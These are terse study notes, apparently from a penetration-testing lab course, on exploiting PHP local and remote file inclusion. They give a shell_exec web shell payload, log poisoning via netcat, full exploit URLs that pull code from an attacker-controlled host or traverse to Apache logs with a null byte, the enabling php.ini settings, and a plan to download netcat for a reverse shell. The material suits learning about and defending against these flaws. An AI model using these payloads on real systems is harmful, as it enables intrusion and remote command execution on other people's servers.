local inclusion Inclusion lfi or rfi

allow an attack to include a local or remote php code
depends on php version and web server config
php.ini register global and url allow wrapper
rfi attacks
allow php to include 
lfi
allow attacker to change existing php code which is more challenging


remote file inclusion
echo '<?php echo shell_exec("ipconfig");?>' > /var/www/evil.txt
modify our lab machine website lang parameter to redirect to our local machine
make sure your apache 2 is running
and 
tail -f /var/log/apache2/access.log
termina null byte string to fix error
%00 ignore everything after

php.ini needs to have this settings to work
allow_url_fopen = on
allow_url_include = on  are both typically turned Off

this issue can be overcome by using lfi by adding local files from the local file system like php code
our options
to contaminate log file
of various services in a way the results php code written into this files
consider this
nc -nv 102.168.15.162 80
and simply paste our php code
<?php echo shell_exec($_GET['cmd']);?>
192.168.15.162/addguestbook.php?name=cake&comment=lol&cmd=ipconfig&LANG=http://192.168.14.220/evil.txt%00&Submit=Submit
this one for the example here
http://192.168.15.162/addguestbook.php?name=cake&comment=lol&cmd=ipconfig&LANG=../../../../../../../../xampp/apache/logs/access.log%00&Submit=Submit
create a reverse shell
option a lets say you don't have tftp ftp or anything available
create vbs script or ps1 to copy nc.
from your server then execute it

not from the doctor to enum shit a this point
